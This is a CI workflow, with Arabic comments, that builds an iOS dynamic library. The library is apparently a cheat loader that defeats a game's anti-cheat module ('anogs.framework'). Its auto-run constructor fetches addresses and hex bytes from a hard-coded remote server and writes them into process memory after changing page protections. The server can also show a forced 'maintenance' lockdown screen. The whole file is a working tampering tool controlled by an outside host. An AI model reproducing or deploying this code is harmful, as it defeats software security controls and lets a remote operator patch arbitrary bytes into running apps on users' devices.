name: Sovereign-VPS-Forge-v200k
on: [push, workflow_dispatch]

jobs:
  build:
    name: "صهر السلاح السيادي للجنرال وسام"
    runs-on: macos-latest
    steps:
      - name: "تجهيز النخاع البرمجي والالتحام السحابي"
        run: |
          echo "🔥 بدء تشغيل مفاعل البصرة (نسخة الثبات والالتحام بالـ VPS)..."
          
          # [1] المفاعل يكتب كود الـ mm السيادي مدمجاً بإحداثيات سيرفر AWS الخاص بك
          cat << 'EOF' > wsam_core.mm
          #import <UIKit/UIKit.h>
          #import <mach-o/dyld.h>
          #import <mach/mach.h>
          #import <Foundation/Foundation.h>

          // [🎯] إحداثيات مركز القيادة - سيرفر الجنرال وسام (VPS)
          #define SERVER_API @"http://16.171.230.58/dashboard_v60.php?api=true"

          @interface SovereignVPSUI : UIView
          @property (nonatomic, strong) UILabel *statusLabel;
          @property (nonatomic, strong) UIView *statusLamp;
          @end

          @implementation SovereignVPSUI
          - (instancetype)initWithFrame:(CGRect)frame {
              self = [super initWithFrame:frame];
              if (self) {
                  // [التصميم الجمالي السيادي]
                  self.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.85];
                  self.layer.cornerRadius = 15;
                  self.layer.borderColor = [UIColor cyanColor].CGColor;
                  self.layer.borderWidth = 1.5;
                  
                  self.layer.shadowColor = [UIColor cyanColor].CGColor;
                  self.layer.shadowOffset = CGSizeMake(0, 0);
                  self.layer.shadowRadius = 10;
                  self.layer.shadowOpacity = 0.6;
                  
                  self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(15, 8, 170, 20)];
                  self.statusLabel.text = @"جاري فحص السيادة...";
                  self.statusLabel.textColor = [UIColor yellowColor];
                  self.statusLabel.font = [UIFont boldSystemFontOfSize:11];
                  self.statusLabel.textAlignment = NSTextAlignmentCenter;
                  [self addSubview:self.statusLabel];
                  
                  self.statusLamp = [[UIView alloc] initWithFrame:CGRectMake(10, 12, 12, 12)];
                  self.statusLamp.backgroundColor = [UIColor yellowColor];
                  self.statusLamp.layer.cornerRadius = 6;
                  [self addSubview:self.statusLamp];
                  
                  [self startVPSSync];
              }
              return self;
          }

          // =========================================================
          // [⚙️] محرك الحقن المليمتري (The Injection Core)
          // بناءً على تقرير الاستخبارات: استهداف مجلد anogs.framework/anogs
          // =========================================================
          - (void)applyPatches:(NSArray *)offsets {
              uintptr_t slide = 0;
              
              // 1. البحث الراداري عن مسار ملف أنجوس مليمتر بمليمتر
              uint32_t imageCount = _dyld_image_count();
              for (uint32_t i = 0; i < imageCount; i++) {
                  const char *imageName = _dyld_get_image_name(i);
                  // البحث عن المسار الدقيق الذي حدده الجنرال وسام
                  if (imageName && strstr(imageName, "anogs.framework/anogs") != NULL) {
                      slide = _dyld_get_image_vmaddr_slide(i);
                      NSLog(@"[Sovereign] Target Framework Spotted: %s", imageName);
                      break;
                  }
              }
              
              // إذا لم يجد الإطار، يفترض الملف الرئيسي كاحتياط
              if (slide == 0) slide = _dyld_get_image_vmaddr_slide(0);

              mach_port_t task = mach_task_self();
              for (NSDictionary *off in offsets) {
                  uintptr_t addr = strtoull([off[@"address"] UTF8String], NULL, 16);
                  uintptr_t target = slide + addr;
                  NSString *hex = off[@"hex_val"];
                  NSMutableData *data = [NSMutableData data];
                  for (int i = 0; i + 2 <= hex.length; i += 2) {
                      unsigned int v;
                      [[NSScanner scannerWithString:[hex substringWithRange:NSMakeRange(i, 2)]] scanHexInt:&v];
                      unsigned char c = (unsigned char)v;
                      [data appendBytes:&c length:1];
                  }
                  
                  // سحق الحماية في الذاكرة
                  vm_protect(task, (vm_address_t)target, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
                  vm_write(task, (vm_address_t)target, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
                  vm_protect(task, (vm_address_t)target, data.length, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
              }
          }

          - (void)startVPSSync {
              NSURL *url = [NSURL URLWithString:SERVER_API];
              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
              [req setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)" forHTTPHeaderField:@"User-Agent"];
              [req setHTTPMethod:@"GET"];
              [req setTimeoutInterval:20.0];

              [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
                  dispatch_async(dispatch_get_main_queue(), ^{
                      if (err || !data) {
                          self.statusLabel.text = @"فشل الاتصال بالـ VPS!";
                          self.statusLamp.backgroundColor = [UIColor redColor];
                          return;
                      }
                      
                      NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
                      if (!json) return;
                      
                      NSString *status = json[@"system_status"];
                      NSString *message = json[@"notification"];
                      NSArray *payload = json[@"payload"];
                      int freeze = [json[@"maintenance_mode"] intValue];

                      if (freeze == 1) {
                          [self showLockdown:message];
                      } else if ([status isEqualToString:@"safe"]) {
                          [self applyPatches:payload];
                          self.statusLabel.text = [NSString stringWithFormat:@"مفعلة ✅ | حقن %lu", (unsigned long)payload.count];
                          self.statusLabel.textColor = [UIColor greenColor];
                          self.statusLamp.backgroundColor = [UIColor greenColor];
                          self.layer.borderColor = [UIColor greenColor].CGColor;
                      } else {
                          self.statusLabel.text = message;
                          self.statusLabel.textColor = [UIColor redColor];
                          self.statusLamp.backgroundColor = [UIColor redColor];
                      }
                  });
              }] resume];
          }

          - (void)showLockdown:(NSString *)m {
              self.hidden = YES;
              UIWindow *win = nil;
              if (@available(iOS 13.0, *)) {
                  for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
                      if (scene.activationState == UISceneActivationStateForegroundActive) {
                          win = scene.windows.firstObject; break;
                      }
                  }
              }
              if (!win) {
                  win = [[UIApplication sharedApplication] keyWindow];
              }
              
              if (win) {
                  UIView *v = [[UIView alloc] initWithFrame:win.bounds];
                  v.backgroundColor = [UIColor blackColor];
                  UILabel *l = [[UILabel alloc] initWithFrame:v.bounds];
                  l.text = [NSString stringWithFormat:@"🛑 صيانة عاجلة:\n%@", m];
                  l.textColor = [UIColor whiteColor];
                  l.textAlignment = NSTextAlignmentCenter;
                  l.numberOfLines = 0;
                  [v addSubview:l];
                  [win addSubview:v];
              }
          }
          @end

          void __attribute__((constructor)) start_vps_engine() {
              // تم ضبط الأقواس بدقة مليمترية!
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                  UIWindow *win = nil;
                  if (@available(iOS 13.0, *)) {
                      for (UIWindowScene* scene in [UIApplication sharedApplication].connectedScenes) {
                          if (scene.activationState == UISceneActivationStateForegroundActive) {
                              win = scene.windows.firstObject; break;
                          }
                      }
                  }
                  if (!win) {
                      win = [UIApplication sharedApplication].keyWindow;
                  }
                  
                  if (win) {
                      CGFloat screenWidth = [UIScreen mainScreen].bounds.size.width;
                      SovereignVPSUI *ui = [[SovereignVPSUI alloc] initWithFrame:CGRectMake(screenWidth/2 - 100, 45, 200, 36)];
                      [win addSubview:ui];
                  }
              });
          }
          EOF

      - name: "مرحلة الصهر المعماري (Clang ARM64 Compilation)"
        run: |
          # استدعاء مسار الـ SDK الرسمي للآيفون من داخل سيرفر الماك
          export SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
          
          # [تكتيك السيادة]: إضافة -Wno-deprecated-declarations لإخراس تحذيرات آبل
          clang -dynamiclib -arch arm64 wsam_core.mm -o Sovereign_VPS_Armed.dylib \
          -isysroot $SDK_PATH \
          -framework Foundation -framework UIKit -framework CoreGraphics \
          -Wno-deprecated-declarations \
          -fobjc-arc -lc++ -Os
          
          echo "✅ تمت عملية الصهر بنجاح يا سيادة الجنرال!"

      - name: "تسليم الغنيمة (Upload Artifact)"
        uses: actions/upload-artifact@v4
        with:
          name: Sovereign-Armed-Ready
          path: Sovereign_VPS_Armed.dylib
